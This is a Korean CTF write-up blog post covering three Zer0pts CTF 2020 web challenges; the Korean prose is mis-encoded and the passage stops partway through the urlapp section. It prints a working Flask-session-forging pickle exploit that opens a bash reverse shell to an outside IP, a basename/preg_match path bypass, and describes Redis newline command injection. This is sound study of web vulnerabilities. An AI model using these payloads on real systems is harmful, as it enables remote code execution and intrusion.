        <content type="html"><![CDATA[<p>Zer0pts CTFëŠ” ì¼ë³¸íŒ€ì¸ Zer0ptsì—ì„œ ì£¼ìµœí•œ ëŒ€íšŒì…ë‹ˆë‹¤. 2020 ëŒ€íšŒëŠ” 3ì›” 7ì¼ì— ì—´ë ¸ì§€ë§Œ ë„ì»¤ íŒŒì¼ì´ ë‚¨ì•„ ìˆì–´ ë¬¸ì œë¥¼ í’€ì–´ ë³´ì•˜ìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ì„œë²„ êµ¬ì¶•ì€ ì•„ë˜ì™€ ê°™ì´ í•˜ë©´ ë©ë‹ˆë‹¤.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;gitlab.com&#x2F;zer0pts&#x2F;zer0pts-ctf-2020.git</span><br><span class="line">cd zer0pts-ctf-2020</span><br><span class="line">cd &lt;Desired Problem&gt;</span><br><span class="line">docker-compose up -d ( if the &#96;-d&#96; option given, it is excuted as the backend. )</span><br></pre></td></tr></table></figure><hr><h2 id="Web-notepad-332pts"><a href="#Web-notepad-332pts" class="headerlink" title="(Web) notepad [332pts]"></a>(Web) notepad [332pts]</h2><blockquote><p>notepad ë¬¸ì œëŠ” Python Pickle ëª¨ë“ˆì˜ loads í•¨ìˆ˜ì—ì„œ ë°œìƒí•˜ëŠ” RCE ì·¨ì•½ì ê³¼ Flask SSTI ì·¨ì•½ì ì„ ì£¼ì œë¡œ í•œ ë¬¸ì œì…ë‹ˆë‹¤. ì¼ë‹¨ app.pyê°€ ì£¼ì–´ì§€ëŠ”ë° í•„ìš”í•œ ë¶€ë¶„ë§Œ í™•ì¸ì„ í•´ë³´ê² ìŠµë‹ˆë‹¤.</p></blockquote><p><span style="color:#631F9C">&#62;</span> SSTI Vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Automatically go back when page is not found &quot;&quot;&quot;</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">&quot;Referer&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>: referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer): referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    </span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;3;URL=&#123;&#125;&quot;&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(referrer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br></pre></td></tr></table></figure><p>404 ì—ëŸ¬ í˜ì´ì§€ë¥¼ í™•ì¸í•´ë³´ë©´ <code>Referer</code> í—¤ë”ë¥¼ ê°€ì ¸ì™€ì„œ <code>URL</code> ê°’ìœ¼ë¡œ ê·¸ëŒ€ë¡œ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. Refererì˜ ëŒ€í•œ ê²€ì¦ ê³¼ì •ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ SSTI ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.<br><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/notepad/1.png?raw=true"><br>ê·¸ë˜ì„œ Referer í—¤ë”ë¡œ &#123;&#123;config&#125;&#125;ë¥¼ ë³´ë‚´ì£¼ë‹ˆ SSTIê°€ ë°œìƒí•´ì„œ config ê°ì²´ë¥¼ ì¶œë ¥í•´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆê³ , ì‹œí¬ë¦¿ í‚¤ê°€ <code>b&#39;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#39;</code>ë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‹œí¬ë¦¿ í‚¤ë¥¼ êµ¬í–ˆê¸° ë•Œë¬¸ì— <code>session</code>ì„ ë§ˆìŒëŒ€ë¡œ ì¡°ì‘ì´ ê°€ëŠ¥í•  ê±° ê°™ìŠµë‹ˆë‹¤.</p><p><span style="color:#631F9C">&#62;</span> Python Pickle Deserialization Vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/note/&lt;int:nid&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notepad</span>(<span class="params">nid=<span class="number">0</span></span>):</span></span><br><span class="line">    data = load()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= nid &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        nid = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>, data=data, nid=nid)</span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Load saved notes &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        savedata = flask.session.get(<span class="string">&#x27;savedata&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = [&#123;<span class="string">&quot;date&quot;</span>: now(), <span class="string">&quot;text&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;*New Note*&quot;</span>&#125;]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>/noteë¥¼ ë³´ë©´ load() í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ë³¼ ìˆìŠµë‹ˆë‹¤. load() í•¨ìˆ˜ëŠ” ì„¸ì…˜ ê°’ì—ì„œ <code>savedata</code>ë¼ëŠ” ê°’ì„ ê°€ì ¸ì™€ì„œ base64 ë””ì½”ë”©ì„ í•˜ê³ , pickle.loads() í•¨ìˆ˜ì˜ ì¸ìë¡œ ë„˜ê²¨ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°”ë¡œ ì—¬ê¸°ì„œ RCE ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì— ìì„¸í•œ ë‚´ìš©ì€ êµ¬ê¸€ì„ í†µí•´ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/notepad/2.png?raw=true"><br>Flask ì„¸ì…˜ ê´€ë ¨ ë‚´ìš©ì„ ì •í™•íˆ ìˆ™ì§€í•˜ê³  ìˆì§€ ì•Šì•„ì„œ êµ¬ê¸€ì— ê²€ìƒ‰ì„ í•´ë³´ë‹ˆ <code>sessions.SecureCookieSessionInterface</code>, <code>Flask</code> ë‘ í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ë©´ ì‹œí¬ë¦¿ í‚¤ë¥¼ ì´ìš©í•´ ì„¸ì…˜ ê°’ì„ ë§Œë“¤ì–´ ì¤„ ìˆ˜ ìˆëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ë¬¼ë¡  Flask í•¨ìˆ˜ë¥¼ ì“°ì§€ ì•Šê³  í´ë˜ìŠ¤ë¥¼ ìƒì„±í•´ì„œë„ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ê·¸ëŸ¬ë‹ˆ ì‹œí¬ë¦¿ í‚¤ë¥¼ ì´ìš©í•´ì„œ ì„¸ì…˜ ê°’ì„ ë³€ì¡°í•˜ê³ , ë³€ì¡°í•œ ì„¸ì…˜ ê°’ì„ ê°€ì§€ê³ , /note/<a href="int:id">int:id</a>ë¡œ ì ‘ê·¼ì„ í•´ì£¼ë©´ load() í•¨ìˆ˜ì˜ pickle.loads() í•¨ìˆ˜ê°€ í˜¸ì¶œì´ ë¼ì„œ RCEê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤. </p><p><span style="color:#631F9C">&#62;</span> Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, base64, pickle, requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/141.164.52.207/12345 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line">key_ = <span class="string">b&#x27;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">  app = Flask(<span class="string">&quot;app&quot;</span>)</span><br><span class="line">  app.secret_key = key_</span><br><span class="line">  </span><br><span class="line">  sscsi = SecureCookieSessionInterface()</span><br><span class="line">  signingSerializer = sscsi.get_signing_serializer(app)</span><br><span class="line">  </span><br><span class="line">  session = signingSerializer.dumps(&#123;<span class="string">&#x27;savedata&#x27;</span>:base64.b64encode(pickle.dumps(RCE()))&#125;)</span><br><span class="line">  print(<span class="string">&quot;Sessions : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(session))</span><br><span class="line">  requests.get(<span class="string">&#x27;http://localhost:8001/note/1&#x27;</span>, cookies = &#123;<span class="string">&#x27;session&#x27;</span>:session&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  print(<span class="string">&quot;[+] RCE in Pickle Start&quot;</span>)</span><br><span class="line">  exploit()</span><br></pre></td></tr></table></figure><p>ê·¸ë˜ì„œ íŒŒì´ì¬ì„ ì´ìš©í•´ì„œ ìœ„ì™€ ê°™ì´ RCE POCë¥¼ ì‘ì„±í•´ì£¼ì—ˆìŠµë‹ˆë‹¤. ì²˜ìŒì—ëŠ” <code>nc</code>ë¥¼ ì´ìš©í•´ì„œ ì‰˜ì„ ë”¸ë ¤ í–ˆì§€ë§Œ ì˜ ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ ê·¸ëƒ¥ ì½”ë“œ ë¯¸ìŠ¤ì¸ ì¤„ ì•Œì•˜ëŠ”ë° <code>bash -c</code>ë¥¼ ì´ìš©í•´ì„œ ì‰˜ì„ ë”°ì£¼ë‹ˆ ì˜ ë˜ì—ˆìŠµë‹ˆë‹¤.<br><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/notepad/3.png?raw=true"><br>RCE POCë¥¼ ëŒë ¤ì£¼ë‹ˆ ì‰˜ì´ ì˜ ë”°ì§€ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆê³ , flagë„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ( nc ëª…ë ¹ì–´ë¥¼ í™•ì¸í•´ë³´ë‹ˆ ëª…ë ¹ì–´ ìì²´ê°€ ì—†ì—ˆìŒ )</p><blockquote><p>FLAG : zer0pts{fl4sk_s3ss10n_4nd_pyth0n_RCE}</p></blockquote><hr><h2 id="Web-Can-you-guess-it-345pts"><a href="#Web-Can-you-guess-it-345pts" class="headerlink" title="(Web) Can you guess it [345pts]"></a>(Web) Can you guess it [345pts]</h2><blockquote><p>Can you guess it ë¬¸ì œëŠ” PHP íŠ¸ë¦­ë¥˜ ë¬¸ì œì…ë‹ˆë‹¤.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#631F9C">&#62;</span> analysis</p><p>FLAGëŠ” config.phpì— ì •ì˜ê°€ ë˜ì–´ ìˆë‹¤ê³  í•©ë‹ˆë‹¤.</p><p>ì½”ë“œë¥¼ ë³´ë©´ <code>$_SERVER[&#39;PHP_SELF&#39;]</code>ì˜ ê°’ì„ highlight_file() í•¨ìˆ˜ì˜ ì¸ìë¡œ ë„˜ê²¨ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>$_SERVER[&#39;PHP_SELF&#39;]</code>ëŠ” í˜„ì¬ í˜ì´ì§€ì˜ ì£¼ì†Œì—ì„œ ë„ë©”ì¸ê³¼ ë„˜ì–´ê°€ëŠ” ê°’(íŒŒë¼ë¯¸í„°)ë¥¼ ì œì™¸í•œ ê²ƒë“¤ì„ ê°€ì ¸ì˜¤ëŠ” ìŠˆí¼ ê¸€ë¡œë²Œ í•¨ìˆ˜ ì…ë‹ˆë‹¤. ì¦‰, Pathë§Œ ê°€ì ¸ì˜¨ë‹¤ëŠ” ê²ƒ ì…ë‹ˆë‹¤.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>í•˜ì§€ë§Œ preg_match() í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ <code>$_SERVER[&#39;PHP_SELF&#39;]</code> ê°’ì„ ê²€ì¦í•˜ê³  ìˆê¸° ë•Œë¬¸ì— ì¼ë°˜ì ìœ¼ë¡œ ì ‘ê·¼ì„ í•˜ê²Œ ë˜ë©´ <code>config.php</code>ê°€ í•„í„°ë§ì— ê±¸ë¦¬ê¸° ë•Œë¬¸ì— í˜ë“¤ ê±° ê°™ìŠµë‹ˆë‹¤.</p><p>ê·¸ëŸ¬ë‹¤ êµ¬ê¸€ë§ì„ í•˜ë‹¤ê°€ <a href="https://ngaa.tistory.com/m/46?category=776250">ì—¬ê¸°ì„œ</a> ì‹ ê¸°í•œ ê²ƒì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. basename í•¨ìˆ˜ì— \x80-\xff ë²”ìœ„ì˜ ê°’ ì¤‘ í•˜ë‚˜ë§Œ ë“¤ì–´ì˜¤ë©´ ê·¸ ê°’ì€ ë¬´ì‹œí•œë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xbb&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xab&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xff&quot;);</span><br><span class="line">config.php</span><br></pre></td></tr></table></figure><p>í…ŒìŠ¤íŠ¸ë¥¼ í•´ë³¸ ê²°ê³¼ \x80-\xff ë²”ìœ„ì˜ ê°’ì„ ëª¨ë‘ ë¬´ì‹œí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ì € ë²”ìœ„ì˜ ê°’ë“¤ì´ prge_matchì— ë“¤ì–´ê°€ë„ ìš°íšŒê°€ ë©ë‹ˆë‹¤.</p><p><span style="color:#631F9C">&#62;</span> Exploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php&#x2F;%aa?source</span><br></pre></td></tr></table></figure><p>ìœ„ pathë¡œ ì ‘ê·¼ì„ í•´ì£¼ë©´ preg_match(), basename() í•¨ìˆ˜ë¥¼ ìš°íšŒí•´ config.phpì˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><blockquote><p>FLAG : zer0pts{gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n}</p></blockquote><hr><h2 id="Web-urlapp-435pts"><a href="#Web-urlapp-435pts" class="headerlink" title="(Web) urlapp [435pts]"></a>(Web) urlapp [435pts]</h2><blockquote><p>urlapp ë¬¸ì œëŠ” ë£¨ë¹„ë¡œ ì‘ì„±ëœ Redis ì„œë¹„ìŠ¤ì—ì„œ Redis SSRF ì·¨ì•½ì ì„ ì£¼ì œë¡œí•œ ë¬¸ì œì…ë‹ˆë‹¤. í•˜ì§€ë§Œ ì™ ì§€ ëª¨ë¥´ê²Œ ìµìŠ¤ë¥¼ ê³„ì† ì‹œë„í•´ë„ set ëª…ë ¹ì–´ê°€ ì œëŒ€ ì¸ì‹ì´ ë˜ì§€ ì•ŠëŠ” ê±° ê°™ë‹¤.</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;GET <span class="subst">#&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">&quot;flag&quot;</span>, File.read(<span class="string">&quot;flag.txt&quot;</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">&quot;H*&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ì·¨ì•½ì ì€ set í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ì„œ url ê°’ì„ valueë¡œ ì´ìš©í•´ì„œ í•˜ë‚˜ì˜ ë°ì´í„°ë¥¼ ìƒì„±í•˜ê³  ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ url íŒŒë¼ë¯¸í„°ì˜ ê°œí–‰ë¬¸ì œì— ëŒ€í•œ í•„í„°ë§ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ redis eval ëª…ë ¹ì–´ë¥¼ ì´ìš©í•´ì„œ set, get ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œë©ë‹ˆë‹¤.</p><p>ê·¸ë˜ì„œ value ê°’ì„ redis.call(â€˜getâ€™,â€™flagâ€™)ë¥¼ ì´ìš©í•´ì„œ flagë¥¼ ê°€ì ¸ì™€ì„œ valueë¡œ ë„£ì–´ì£¼ê³ , í•´ë‹¹ ë°ì´í„°ì˜ í‚¤ë¥¼ ì´ìš©í•´ì„œ ì ‘ê·¼í•˜ë©´ flagë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ìµìŠ¤ 